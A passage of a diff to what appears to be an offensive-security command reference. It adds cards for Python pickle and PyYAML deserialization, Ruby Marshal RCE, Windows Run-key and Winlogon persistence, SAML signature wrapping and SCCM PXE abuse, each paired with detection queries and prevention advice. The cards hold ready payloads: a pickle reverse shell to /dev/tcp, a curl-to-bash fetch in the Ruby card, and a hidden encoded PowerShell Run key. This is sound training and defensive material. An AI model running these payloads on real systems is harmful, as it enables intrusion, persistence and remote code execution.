+        "artifacts": "WDS/PXE and TFTP (UDP 69) logs on the DP; DHCP option-60 PXE requests; Sysmon network events; unusually timed OS-deployment requests.",
+        "splunk_spl": "index=network (dest_port=69 OR transport=udp) uri=\"*.bcd\" OR uri=\"*boot*\"\n| stats count by src_ip, dest_ip\n| where count > 3",
+        "elastic_kql": "network.transport:\"udp\" and destination.port:69 and source.ip:*",
+        "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort == 69 and Protocol == \"Udp\"\n| summarize Count=count() by DeviceName, RemoteIP, bin(TimeGenerated, 1h)\n| where Count > 3",
+        "sigma_rules": "net_sccm_pxe_tftp_media_request_anomaly",
+        "prevention": "Set a strong PXE media password and rotate it; restrict PXE to dedicated imaging VLANs; use the OSDJoinAccount with least privilege; prefer domain-join via a per-image offline-join blob rather than embedded creds; monitor TFTP/PXE requests from non-imaging hosts and disable PXE where unused.",
+        "sources": [
+          "https://github.com/MWR-CyberSec/PXEThief",
+          "https://github.com/subat0mik/Misconfiguration-Manager"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Unexpected PXE/TFTP boot media request to SCCM DP",
+            "logic": "DeviceNetworkEvents\n| where RemotePort == 69 and Protocol == \"Udp\"\n| summarize Count=count() by DeviceName, RemoteIP, bin(TimeGenerated, 1h)\n| where Count > 3",
+            "data_source": "network-flow",
+            "attack": [
+              "T1552.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "low",
+            "false_positives": "Legitimate OS deployment and re-imaging generate PXE/TFTP traffic.",
+            "tuning": "Scope to imaging VLANs and maintenance windows; alert on PXE requests from production subnets or outside imaging windows."
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-pygpoabuse",
       "name": "pyGPOAbuse - Linux-side GPO Abuse",
       "command": "pygpoabuse.py <domain>/<user>:<password> -gpo-id <guid> -command '<cmd>'",
@@ -131737,6 +135972,113 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Hijacks a module imported by a root-run Python script:\n  sudo /usr/bin/python3 ./mem_status.py   run the sudo-allowed script after planting your hijack\nFirst find (sudo -l) the runnable script and which module it imports, then pick a writable vector: overwrite the module file, drop a same-named module earlier in sys.path, use PYTHONPATH (if SETENV is allowed), or append to a writable script. Your code (e.g. os.system('/bin/bash')) then runs as root."
+    },
+    {
+      "id": "deser-python-pickle",
+      "name": "Python pickle / PyYAML Deserialization RCE",
+      "command": "python3 -c \"import pickle,os;print(pickle.dumps(type('R',(object,),{'__reduce__':lambda s:(os.system,('<command>',))})()))\"",
+      "description": "Python's pickle module executes a __reduce__ callable during unpickling, so a crafted object returning (os.system, (cmd,)) yields code execution the moment pickle.loads() touches attacker data. The same class of bug hits PyYAML's yaml.load() without a safe loader (python/object/apply tags) and other object-reconstructing deserializers. Sinks appear in session blobs, caches, message queues, and ML model files.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Deserialization",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Python docs; PyYAML",
+      "tags": [
+        "deserialization",
+        "pickle",
+        "python",
+        "pyyaml",
+        "__reduce__",
+        "rce"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== IDENTIFY A PICKLE SINK ===\n  # pickle.loads/pickle.load, cPickle, pandas.read_pickle, joblib.load, torch.load,\n  # celery/redis caches, Django sessions with the pickle serializer.\n  # Raw pickle starts with \\x80\\x04\\x95 (protocol 4); base64 often starts with gASV.\n\n=== CRAFT A MALICIOUS PICKLE ===\n  import pickle, os, base64\n  class RCE:\n      def __reduce__(self):\n          return (os.system, (\"id\",))\n  payload = pickle.dumps(RCE())\n  print(base64.b64encode(payload).decode())   # ship this where loads() will read it\n  # Reverse shell variant:\n  #   return (os.system, (\"bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'\",))\n\n=== TRIGGER ===\n  # Server-side anything that does:\n  pickle.loads(base64.b64decode(attacker_blob))   # fires __reduce__ -> os.system\n\n=== PYYAML (yaml.load without SafeLoader) ===\n  # Vulnerable: yaml.load(data)  or yaml.load(data, Loader=yaml.Loader/FullLoader-pre-5.1)\n  payload: \"!!python/object/apply:os.system ['id']\"\n  payload: \"!!python/object/apply:subprocess.check_output [['id']]\"\n  # Safe: yaml.safe_load(data)\n\n=== OTHER PYTHON SINKS ===\n  jsonpickle.decode, PyYAML, dill, shelve, marshal (less controllable),\n  torch.load / numpy.load(allow_pickle=True) for ML supply-chain.\n\n=== ALTERNATIVES ===\n  Ruby Marshal.load universal gadget - see deser-ruby-universal\n  Node.js node-serialize - see deser-nodejs",
+      "examples": [
+        {
+          "label": "Build a __reduce__ os.system pickle",
+          "command": "python3 -c \"import pickle,os,base64;print(base64.b64encode(pickle.dumps(type('R',(object,),{'__reduce__':lambda s:(os.system,('id',))})())).decode())\""
+        },
+        {
+          "label": "PyYAML unsafe load RCE tag",
+          "command": "echo '!!python/object/apply:os.system [\"id\"]' | python3 -c \"import yaml,sys;yaml.load(sys.stdin,Loader=yaml.Loader)\""
+        },
+        {
+          "label": "Reverse shell pickle command",
+          "command": "python3 -c \"import pickle,os;pickle.dumps(type('R',(object,),{'__reduce__':lambda s:(os.system,('bash -c \\\"bash -i >& /dev/tcp/<ip>/<port> 0>&1\\\"',))})())\""
+        }
+      ],
+      "references": [
+        {
+          "title": "Python docs - pickle (security)",
+          "url": "https://docs.python.org/3/library/pickle.html"
+        },
+        {
+          "title": "PyYAML - yaml.load warning",
+          "url": "https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation"
+        },
+        {
+          "title": "OWASP Deserialization Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "exploit-deserialization",
+          "note": "Generic multi-language deserialization hub card.",
+          "rel": "prereq"
+        },
+        {
+          "id": "deser-ruby-universal",
+          "note": "Ruby Marshal.load RCE, a sibling runtime.",
+          "rel": "alternative"
+        },
+        {
+          "id": "deser-php-phpggc",
+          "note": "PHP object-injection chains, a sibling runtime.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "pickle is by design a virtual machine that calls the reconstructor returned by __reduce__, so unpickling attacker data runs attacker-chosen callables such as os.system. PyYAML's non-safe loaders resolve python/object tags the same way. There is no sandbox around this.",
+        "prerequisites": "Code that unpickles (or yaml.load without SafeLoader) data an attacker can influence - request body, cookie, cache entry, uploaded model, or queue message.",
+        "impact": "Remote code execution as the Python process user.",
+        "detection": "[MITRE T1190] Inbound blobs beginning with \\x80 pickle opcodes or gASV base64, or YAML containing !!python/object; [MITRE T1059] the python interpreter spawning sh/bash/cmd children.",
+        "artifacts": "Proxy/web logs with pickle/base64 blobs or !!python/object tags; EDR process tree python -> sh/bash; Linux auditd execve of a shell parented by python.",
+        "splunk_spl": "index=web (request_body=\"*gASV*\" OR request_body=\"*!!python/object*\" OR request_body=\"*\\\\x80\\\\x04*\")\n| table _time, src_ip, uri_path, request_body",
+        "elastic_kql": "http.request.body.content:(*gASV* or *!!python/object*)",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName startswith \"python\"\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"powershell.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+        "sigma_rules": "python_deserialization_pickle_shell_child",
+        "prevention": "Never unpickle untrusted data; use JSON or a signed/HMAC'd format. Use yaml.safe_load exclusively. For ML artifacts prefer safetensors over pickle-backed formats; set numpy/torch allow_pickle=False where possible; run workers least-privileged and network-segmented.",
+        "sources": [
+          "https://docs.python.org/3/library/pickle.html",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Python interpreter spawning a shell (pickle RCE)",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName startswith \"python\"\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"powershell.exe\",\"curl\",\"wget\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+            "data_source": "edr",
+            "attack": [
+              "T1059"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Scripts and notebooks that legitimately invoke subprocess shells",
+            "tuning": "Scope to web/worker service accounts; allowlist known automation"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -136372,6 +140714,130 @@ const COMMAND_DATA = {
       "explain": "Creates a PSSession endpoint that runs as a stored credential, solving the Kerberos double-hop:\n  Register-PSSessionConfiguration   define a custom WinRM endpoint\n  -Name <sessname>         the endpoint name to connect to\n  -RunAsCredential <domain>\\<user>   run every session under these creds, so they exist on the box for a second hop\n  -Force                   overwrite/skip prompts\nConnect to it (Enter-PSSession -ConfigurationName <sessname>) and onward access to a third machine now authenticates, instead of failing with no forwarded credentials."
     },
     {
+      "id": "persist-registry-run-keys",
+      "name": "Registry Run Keys and Winlogon Autostart Persistence",
+      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v <name> /d <payload> /f",
+      "description": "Autostart persistence via the registry: Run/RunOnce keys execute a command at user logon (HKCU, no admin) or at any user logon (HKLM, admin), and the Winlogon Userinit/Shell values run a payload during the logon sequence under the user's session. These are the most common and simplest Windows persistence mechanisms and the first place defenders and Autoruns look.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Persistence",
+      "subcategory": "Persistence",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MITRE ATT&CK T1547.001; Microsoft Run-key documentation",
+      "tags": [
+        "persistence",
+        "run-keys",
+        "winlogon",
+        "userinit",
+        "registry",
+        "autostart"
+      ],
+      "mitre": [
+        "T1547.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== RUN / RUNONCE KEYS ===\n  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run           # current user, each logon (no admin)\n  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run           # all users, each logon (admin)\n  ...\\CurrentVersion\\RunOnce                                   # runs once then deletes itself\n  ...\\Policies\\Explorer\\Run                                    # policy-based Run\n\n  reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /d \"powershell -w hidden -enc <b64>\" /f\n\n=== WINLOGON (logon sequence) ===\n  HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    Userinit  = C:\\Windows\\system32\\userinit.exe,   <appended payload>\n    Shell     = explorer.exe,   <appended payload>\n  # APPEND to the existing value (comma-separated) - do not replace it or you break logon.\n\n=== OTHER AUTOSTART VALUES ===\n  ...\\Winlogon\\Notify (legacy), Image File Execution Options (see accessibility backdoor card).\n\n=== ENUMERATE (hunt / verify) ===\n  reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  autorunsc.exe -a * -c       # Sysinternals, CSV of all autostarts\n\n=== ALTERNATIVES ===\n  Scheduled tasks, services, WMI subscription, COM hijack - all stealthier than Run keys.",
+      "examples": [
+        {
+          "label": "Add an HKCU Run key (no admin)",
+          "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v <name> /d <payload> /f"
+        },
+        {
+          "label": "Append a payload to Winlogon Userinit (admin) - keep the original value",
+          "command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d \"C:\\Windows\\system32\\userinit.exe,<payload>\" /f"
+        },
+        {
+          "label": "Hunt all autostart entries with Sysinternals Autoruns",
+          "command": "autorunsc.exe -a * -c -nobanner"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1547.001 - Registry Run Keys / Startup Folder",
+          "url": "https://attack.mitre.org/techniques/T1547/001/"
+        },
+        {
+          "title": "Microsoft - Run and RunOnce Registry Keys",
+          "url": "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "startup-autoruns",
+          "note": "Autoruns enumerates every autostart location including these keys.",
+          "rel": "next"
+        },
+        {
+          "id": "persist-service-creation",
+          "note": "Service creation is a SYSTEM-level persistence alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "persist-com-hijacking",
+          "note": "COM hijack is a quieter, HKCU-only persistence option.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Run/RunOnce keys and the Winlogon Userinit/Shell values are legitimate autostart mechanisms Windows executes automatically at logon. HKCU variants require no admin, and the values accept arbitrary command lines, so an attacker simply adds (or appends to) a value to gain execution every logon.",
+        "prerequisites": "Write access to the key: HKCU Run/RunOnce need only the user; HKLM Run and Winlogon values need local admin.",
+        "impact": "T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder. Reliable persistence that re-runs the payload at each logon in the user (or, via Winlogon, logon-sequence) context.",
+        "detection": "Monitor registry sets (Sysmon EID 13) to the Run/RunOnce keys and to Winlogon Userinit/Shell; any modification of Userinit/Shell away from the default is high-fidelity. Alert on Run values pointing at powershell, encoded commands, scripting hosts, or binaries in user-writable paths. Autoruns and EDR autostart inventories surface new entries.",
+        "artifacts": "Sysmon EID 13 (RegistryValueSet) on the Run/RunOnce/Winlogon keys; Security 4657 (registry value modified) with auditing enabled; the referenced binary/script on disk; Autoruns CSV showing the new entry.",
+        "splunk_spl": "index=sysmon EventCode=13 (TargetObject=\"*\\\\CurrentVersion\\\\Run*\" OR TargetObject=\"*\\\\Winlogon\\\\Userinit\" OR TargetObject=\"*\\\\Winlogon\\\\Shell\")\n| table _time, Computer, Image, TargetObject, Details",
+        "elastic_kql": "event.code:\"13\" and registry.path:(*\\\\CurrentVersion\\\\Run* or *\\\\Winlogon\\\\Userinit or *\\\\Winlogon\\\\Shell)",
+        "sentinel_kql": "DeviceRegistryEvents\n| where RegistryKey has_any (\"\\\\CurrentVersion\\\\Run\",\"\\\\CurrentVersion\\\\RunOnce\",\"\\\\Winlogon\")\n| where RegistryValueName in~ (\"Userinit\",\"Shell\") or RegistryValueData has_any (\"powershell\",\"-enc\",\"\\\\AppData\\\\\",\"\\\\Temp\\\\\",\".vbs\",\".js\")\n| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData",
+        "sigma_rules": "registry_set_persistence_run_key_winlogon",
+        "prevention": "Enable registry auditing (4657) and Sysmon registry eventing on the autostart keys; baseline legitimate Run entries and alert on new ones, and alert on ANY change to Winlogon Userinit/Shell; restrict local admin to limit HKLM/Winlogon writes; run Autoruns reviews and use ASR/WDAC to block unsigned payloads the keys would launch.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1547/001/",
+          "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Winlogon Userinit/Shell modified away from default",
+            "logic": "DeviceRegistryEvents\n| where RegistryKey has \"\\\\Winlogon\" and RegistryValueName in~ (\"Userinit\",\"Shell\")\n| where RegistryValueData !in~ (\"C:\\\\Windows\\\\system32\\\\userinit.exe,\",\"explorer.exe\")\n| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryValueName, RegistryValueData",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1547.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Rare; a few legitimate shell replacements (kiosk builds)",
+            "tuning": "Allowlist approved kiosk/shell configurations"
+          },
+          {
+            "platform": "splunk",
+            "name": "Run key set to a script or user-path binary",
+            "logic": "index=sysmon EventCode=13 TargetObject=\"*\\\\CurrentVersion\\\\Run*\" (Details=\"*powershell*\" OR Details=\"*-enc*\" OR Details=\"*\\\\AppData\\\\*\" OR Details=\"*\\\\Temp\\\\*\" OR Details=\"*.vbs\" OR Details=\"*.js\")\n| table _time, Computer, Image, TargetObject, Details",
+            "data_source": "sysmon",
+            "attack": [
+              "T1547.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Some legitimate apps add Run entries pointing at AppData",
+            "tuning": "Allowlist known software updaters by name and signature"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "sysmon",
+            "windows-security"
+          ],
+          "better_with": [
+            "edr",
+            "defender-endpoint"
+          ]
+        }
+      }
+    },
+    {
       "id": "ad-impacket-rbcd",
       "name": "Resource-Based Constrained Delegation (RBCD, Linux)",
       "command": "impacket-rbcd -delegate-to '<target_account>$' -delegate-from 'EVIL$' -action write -dc-ip <dc_ip> <domain>/<user>:<password>",
@@ -140817,6 +145283,114 @@ const COMMAND_DATA = {
       "explain": "Over-pass-the-hash with Rubeus - turn a key into a TGT and inject it:\n  asktgt                   request a TGT from the KDC\n  /domain:<domain> /user:<user>   the account\n  /rc4:<nt_hash>           the NT hash used as the Kerberos key (/aes256 for opsec)\n  /ptt                     inject the resulting ticket into this session\nThen tools authenticate as that user over Kerberos. dump lists tickets, ptt /ticket loads a .kirbi, createnetonly spawns a sacrificial logon session."
     },
     {
+      "id": "deser-ruby-universal",
+      "name": "Ruby Marshal.load Universal Deserialization RCE",
+      "command": "ruby universal_rce.rb \"<command>\" > payload.bin",
+      "description": "Ruby's Marshal.load reconstructs arbitrary objects and, via a universal gadget chain that abuses Gem::Requirement / Gem::Installer / Gem::StubSpecification present in the standard library, reaches code execution without any third-party dependency. A single public gadget (the Universal Deserialisation Gadget) turns any Marshal.load of attacker data into RCE; YAML.load (Psych) is similarly abusable.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Deserialization",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Universal Deserialisation Gadget for Ruby (devcraft.io)",
+      "tags": [
+        "deserialization",
+        "ruby",
+        "marshal",
+        "universal-gadget",
+        "psych",
+        "yaml",
+        "rce"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== IDENTIFY A RUBY MARSHAL SINK ===\n  # Marshal.load / Marshal.restore on request data, cookies, caches (Rails Marshal cache store),\n  # ActiveSupport::MessageVerifier blobs with a known/leaked secret, or YAML.load (Psych).\n  # Raw Marshal streams begin with bytes 04 08 (version 4.8).\n\n=== UNIVERSAL GADGET (no gems required) ===\n  # The public universal_rce.rb builds a Marshal payload using only stdlib classes\n  # (Gem::Requirement -> Gem::DependencyList / Gem::Source::Git -> Kernel#system).\n  # Generate and deliver:\n  ruby universal_rce.rb \"id\" > payload.bin\n  ruby universal_rce.rb \"curl http://<ip>/x|bash\" | base64 -w0\n  # Server-side Marshal.load(payload) fires the chain -> command runs.\n\n=== TRIGGER ===\n  # Anything doing:\n  Marshal.load(Base64.decode64(params[:data]))   # RCE\n\n=== YAML / PSYCH VARIANT ===\n  # Vulnerable: YAML.load(data) on old Psych (pre safe-by-default).\n  # Payload uses the same Gem:: gadget serialized as a YAML object graph\n  # (e.g. !ruby/object:Gem::Requirement ...). Safe API: YAML.safe_load / Psych.safe_load.\n\n=== RAILS NOTES ===\n  # Rails cookie/session RCE historically needed the secret_key_base; the Marshal\n  # universal gadget needs only a raw Marshal.load sink, no secret.\n\n=== ALTERNATIVES ===\n  Python pickle __reduce__ - see deser-python-pickle\n  Node.js node-serialize - see deser-nodejs",
+      "examples": [
+        {
+          "label": "Generate universal Marshal RCE payload",
+          "command": "ruby universal_rce.rb \"id\" > payload.bin"
+        },
+        {
+          "label": "Base64 payload for a cookie/parameter",
+          "command": "ruby universal_rce.rb \"id\" | base64 -w0"
+        },
+        {
+          "label": "Confirm a Marshal blob (magic 04 08)",
+          "command": "xxd payload.bin | head -1"
+        }
+      ],
+      "references": [
+        {
+          "title": "Universal Deserialisation Gadget for Ruby 2.x-3.x",
+          "url": "https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html"
+        },
+        {
+          "title": "PortSwigger - Insecure deserialization",
+          "url": "https://portswigger.net/web-security/deserialization"
+        },
+        {
+          "title": "OWASP Deserialization Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "exploit-deserialization",
+          "note": "Generic multi-language deserialization hub card.",
+          "rel": "prereq"
+        },
+        {
+          "id": "deser-python-pickle",
+          "note": "Python pickle RCE, a sibling runtime.",
+          "rel": "alternative"
+        },
+        {
+          "id": "deser-nodejs",
+          "note": "Node.js serialization RCE, a sibling runtime.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Marshal.load rebuilds any object and invokes its reconstruction hooks. The universal gadget chains stdlib RubyGems classes so that deserialization alone calls Kernel#system, requiring no third-party gems and no application secret. Psych YAML.load resolves the same object tags.",
+        "prerequisites": "A Marshal.load (or non-safe YAML.load) on data the attacker controls - request param, cookie, Marshal-backed cache, or message.",
+        "impact": "Remote code execution as the Ruby/Rails process user.",
+        "detection": "[MITRE T1190] Inbound blobs beginning with the 04 08 Marshal header or !ruby/object YAML tags; [MITRE T1059] the ruby process spawning sh/bash children.",
+        "artifacts": "Web/proxy logs with Marshal (\\x04\\x08) or base64 blobs and !ruby/object tags; EDR/auditd process tree ruby -> sh/bash; unexpected outbound from the app host.",
+        "splunk_spl": "index=web (request_body=\"*!ruby/object*\" OR request_body=\"*\\\\x04\\\\x08*\")\n| table _time, src_ip, uri_path, request_body",
+        "elastic_kql": "http.request.body.content:(*!ruby\\/object* or *BAh*)",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"ruby\",\"ruby.exe\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+        "sigma_rules": "ruby_marshal_deserialization_shell_child",
+        "prevention": "Never Marshal.load untrusted data; use JSON. Use YAML.safe_load / Psych.safe_load only. For Rails sessions/caches use a signed+encrypted JSON serializer (not :marshal); keep secret_key_base secret; run workers least-privileged.",
+        "sources": [
+          "https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Ruby process spawning a shell (Marshal RCE)",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"ruby\",\"ruby.exe\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"curl\",\"wget\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+            "data_source": "edr",
+            "attack": [
+              "T1059"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Rails tasks or tooling that legitimately shell out",
+            "tuning": "Scope to web/worker tiers; allowlist deploy and cron identities"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-runas-netonly",
       "name": "runas /netonly - Inject AD Creds on Windows",
       "command": "runas /netonly /user:<domain>\\<user> powershell",
@@ -141517,6 +146091,114 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "web-saml-signature-wrapping",
+      "name": "SAML Signature Wrapping (XSW) and Signature Exclusion",
+      "command": "POST /saml/acs HTTP/1.1\\nContent-Type: application/x-www-form-urlencoded\\n\\nSAMLResponse=<token>",
+      "description": "Forges or alters a signed SAML assertion so the service provider authenticates the attacker as another user. Covers the eight XML Signature Wrapping (XSW) variants, signature-exclusion attacks (the SP validates a signature that is no longer present or no longer covers the assertion), XML comment injection in NameID to canonicalize into another user, and driving all of it with the SAML Raider Burp extension.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web",
+      "subcategory": "Authentication",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger Web Security Academy - SAML / CSPN",
+      "tags": [
+        "saml",
+        "xsw",
+        "signature-wrapping",
+        "signature-exclusion",
+        "sso",
+        "saml-raider"
+      ],
+      "mitre": [
+        "T1190",
+        "T1550",
+        "T1606.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  A SAML Response is XML signed by the IdP. The SP must (a) verify the signature and (b) ensure the signed element is the SAME element it consumes. XSW splits those: the signature validates against a legitimate assertion while the SP processes an attacker-injected one.\n\n=== XSW VARIANTS (8 total, XSW1-XSW8) ===\n  - Clone the signed Assertion, change the copy's NameID/attributes, position it so the SP reads the evil copy but the validator checks the original.\n  - Move the Signature's Reference URI to point at the original while the evil assertion sits where the SP looks it up.\n  - Vary by element (Response vs Assertion signature) and placement (Extensions, wrapper nodes).\n\n=== SIGNATURE EXCLUSION ===\n  Strip the <ds:Signature> element entirely. If the SP falls back to 'no signature = accept', you can submit an unsigned, fully attacker-authored assertion. Test by deleting the Signature node and forging the assertion.\n\n=== XML COMMENT INJECTION (NameID) ===\n  <NameID>admin<!---->@evil.com</NameID> - some XML text-extraction libraries return only 'admin' after a comment, so the signature (over the full string) stays valid while the SP maps to a different identity. CVE-class bug in several SAML libraries.\n\n=== SAML RAIDER (Burp) ===\n  - Intercept the SAMLResponse (base64, often also inflated for Redirect binding).\n  - 'SAML Raider' tab: edit the assertion, run 'XSW' presets (XSW1-8), remove signatures, re-sign with a self-signed cert to test cert validation.\n  - 'Send certificate to SAML Raider Certs' to test if the SP trusts attacker certs.\n\n=== DECODE / RE-ENCODE MANUALLY ===\n  echo '<token>' | base64 -d | python3 -c 'import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(),-15))'",
+      "examples": [
+        {
+          "label": "Decode a POST-binding SAMLResponse",
+          "command": "echo '<token>' | base64 -d | xmllint --format -"
+        },
+        {
+          "label": "Signature-exclusion test (strip the Signature node, resubmit)",
+          "command": "SAMLResponse=<token>   # same assertion with <ds:Signature> deleted"
+        },
+        {
+          "label": "XML comment injection in NameID",
+          "command": "<saml:NameID>admin<!---->@internal.local</saml:NameID>"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - SAML (Burp docs / research)",
+          "url": "https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-saml"
+        },
+        {
+          "title": "CSPN / SAML Raider (GitHub)",
+          "url": "https://github.com/CompassSecurity/SAMLRaider"
+        },
+        {
+          "title": "On Breaking SAML - Somorovsky et al. (XSW paper)",
+          "url": "https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-golden-saml",
+          "note": "Golden SAML forges assertions with a stolen IdP signing key - the cert-trust end of the same class.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-jwt-attacks",
+          "note": "Token-signing-bypass mindset carries over to JWT alg/none and key confusion.",
+          "rel": "alternative"
+        },
+        {
+          "id": "upload-svg-xxe",
+          "note": "SAML is XML - XXE in the SAMLResponse parser is an adjacent attack.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The SP validates an XML signature but then consumes a different element than the one that was signed (wrapping), accepts an assertion with no signature (exclusion), or uses an XML library whose text extraction diverges from the canonicalized signed bytes (comment injection). Each decouples 'what was signed' from 'what is trusted'.",
+        "prerequisites": "A SAML SP that accepts an IdP-issued SAMLResponse, and at least one legitimately signed assertion to clone or wrap. For exclusion, an SP that does not strictly require a valid signature.",
+        "impact": "Authentication as an arbitrary user (including administrators) at the SP - full SSO account takeover and privilege escalation without any valid credential.",
+        "detection": "[MITRE T1606.002] SAML assertions that fail schema/signature strictness, responses containing multiple Assertion elements, assertions with comments inside NameID, signatures whose Reference URI does not match the processed assertion, and self-signed or unexpected signing certificates in the ACS logs.",
+        "artifacts": "SP (relying party) access logs for the /saml/acs (Assertion Consumer Service) endpoint, SAML processing/error logs, the raw SAMLResponse, and IdP sign-in logs that show no corresponding issuance.",
+        "splunk_spl": "index=web uri_path=\"/saml/acs\"\n| rex field=form_data \"SAMLResponse=(?<saml>[^&]+)\"\n| eval decoded=urldecode(saml)\n| where like(decoded, \"%<!--%\") OR mvcount(split(decoded,\"<saml:Assertion\"))>2\n| stats count by clientip",
+        "elastic_kql": "url.path:\"/saml/acs\" and (http.request.body.content:*Assertion*Assertion* or http.request.body.content:*NameID*--*)",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem =~ \"/saml/acs\"\n| extend body = tostring(csUriQuery)\n| where body contains \"%3C%21--\" or body contains \"Assertion\"\n| summarize count() by cIP, csUriStem",
+        "sigma_rules": "web_saml_xsw_signature_wrapping",
+        "prevention": "Use a hardened SAML library that validates the signature over the exact element consumed (schema-hardening, reject multiple assertions, reject comments in NameID). Require signed assertions AND signed responses; pin the IdP signing certificate; reject self-signed/unknown certs; enforce audience, recipient, NotOnOrAfter, and InResponseTo.",
+        "sources": [
+          "https://github.com/CompassSecurity/SAMLRaider",
+          "https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-saml"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "SAML ACS response with multiple assertions or comment-injected NameID",
